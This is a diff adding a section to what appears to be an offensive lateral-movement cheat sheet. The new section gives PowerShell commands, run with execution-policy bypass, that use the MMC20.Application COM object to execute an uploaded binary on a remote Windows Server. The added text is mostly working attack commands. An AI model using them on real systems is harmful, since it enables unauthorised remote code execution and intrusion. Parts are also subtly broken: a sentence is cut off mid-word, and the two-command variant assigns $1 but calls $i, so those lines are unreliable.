@@ -38,6 +38,17 @@ sc \\<IP_ADDRESS> qc vss
 
 -- MMC COM Object --
 
+Upload binary to remote machine system folder and execute via MMC COM execution. Set the proper remote IP and uploaded binary path in the command below and execute via powershell.exe. FILEPATH = full path to target executable to star
+
+Note: Only works against Windows Server Target
+
+powershell -ep bypass -nop -Command ([activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,”<IP_ADDRESS>”))).Document.ActiveView.ExecuteShellCommand(“<FILE_PATH>”,$null,$null,”7”)
+
+Create 2 Commands
+
+$1 = ([activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,”<IP_ADDRESS>”)))
+$i.Document.ActiveView.ExecuteShellCommand(“<FILE_PATH>”,$null,$null,”7”)
+
 
 -- Remote Schtasks Execution --
 
